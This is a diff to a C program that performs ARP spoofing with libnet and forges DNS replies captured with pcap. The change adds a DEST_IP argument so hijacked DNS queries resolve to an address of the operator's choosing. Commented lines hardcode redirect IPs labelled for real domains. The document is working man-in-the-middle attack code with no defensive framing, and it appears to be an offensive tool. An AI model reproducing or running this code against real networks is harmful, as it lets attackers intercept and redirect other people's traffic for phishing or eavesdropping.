@@ -20,6 +20,7 @@
 struct arguments{
 	char *host;
 	char *interface;
+	char *dest_ip;
 };
 
 void* arp_spoof(void *args){
@@ -57,6 +58,7 @@ void* arp_spoof(void *args){
    		ln);                             /* libnet context       */
   	libnet_write(ln);
 	libnet_destroy(ln);
+	sleep(1);
 	}
 }
 
@@ -104,12 +106,12 @@ void process_dns_query(const u_char *packet, struct dnshdr **dns_hdr, struct dns
 	dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
 }
 
-unsigned int create_answer(char *host, struct dnshdr *dns_hdr, char* dns_answer, struct dnsquery *dns_query){
+unsigned int create_answer(char *dest_ip, struct dnshdr *dns_hdr, char* dns_answer, struct dnsquery *dns_query){
 	unsigned char host_ip[4];
 	unsigned int size = 0;
 
-	sscanf(host, "%d.%d.%d.%d", (int *)&host_ip[0], (int *)&host_ip[1], (int *)&host_ip[2], (int *)&host_ip[3]);
-	//sscanf("51.254.121.149", "%d.%d.%d.%d", (int *)&host_ip[0], (int *)&host_ip[1], (int *)&host_ip[2], (int *)&host_ip[3]);	//adw1n.com
+	sscanf(dest_ip, "%d.%d.%d.%d", (int *)&host_ip[0], (int *)&host_ip[1], (int *)&host_ip[2], (int *)&host_ip[3]);
+	//sscanf("5.134.209.94", "%d.%d.%d.%d", (int *)&host_ip[0], (int *)&host_ip[1], (int *)&host_ip[2], (int *)&host_ip[3]);	//otomoto.pl
 	//header
 	memcpy(&dns_answer[0], dns_hdr->id, 2);	//id
 	memcpy(&dns_answer[2], "\x81\x80", 2);	//flags
@@ -206,25 +208,25 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes){
 	struct dnsquery dns_query;
 	char udp_answer[8192];
 	char* dns_answer;
-	char* host;
+	char* dest_ip;
 	unsigned int answer_size;
 	struct net_addr naddr;
 
 	memset(&naddr, 0, sizeof(struct net_addr));
 
 	process_dns_query(bytes, &dns_hdr, &dns_query, &naddr);
-	printf("Captured query: %s\n", dns_query.qname);
+	printf("\nCaptured query: %s\n", dns_query.qname);
 	printf("src_ip: %d, dst_ip: %d, port: %d\n", naddr.src_ip, naddr.dst_ip, naddr.port);
-	
+
 	dns_answer = udp_answer + sizeof(struct ip) + sizeof(struct udphdr);
-	host = (char*)user;
-	answer_size = create_answer(host, dns_hdr, dns_answer, &dns_query);
+	dest_ip = (char*)user;
+	answer_size = create_answer(dest_ip, dns_hdr, dns_answer, &dns_query);
 	build_datagram(udp_answer, answer_size, naddr);
 	answer_size += (sizeof(struct ip) + sizeof(struct udphdr));
 	send_answer(udp_answer, naddr, answer_size);
 }
 
-void dns_spoof(char *host, char *interface){
+void dns_spoof(char *dest_ip, char *interface){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t *handle;
 	char filter[32];
@@ -246,26 +248,29 @@ void dns_spoof(char *host, char *interface){
 		printf("dns_spoof: error setting filter: %s\n", pcap_geterr(handle));
 	}
 	
-	pcap_loop(handle, -1, trap, (u_char*)host);
+	pcap_loop(handle, -1, trap, (u_char*)dest_ip);
 	
 	pcap_freecode(&fp);
 	pcap_close(handle);
 }
 
 int main(int argc, char** argv) {
-  	if (argc < 3){
-		printf("Usage: %s HOST INTERFACE\n", argv[0]);
+  	if (argc < 4){
+		printf("Usage: %s HOST INTERFACE DEST_IP\n", argv[0]);
 		exit(-1);
 	}
 	struct arguments args;
 	args.host = argv[1];
 	args.interface = argv[2];
+	args.dest_ip = argv[3];
+	
 	pthread_t tid;
 	if(pthread_create(&tid, NULL, arp_spoof, (void *)&args) != 0){
 		printf("Failed to create thread\n");
 		exit(-1);
 	}
-	dns_spoof(args.host, args.interface);
+	
+	dns_spoof(args.dest_ip, args.interface);
 	
   	return EXIT_SUCCESS;
 }
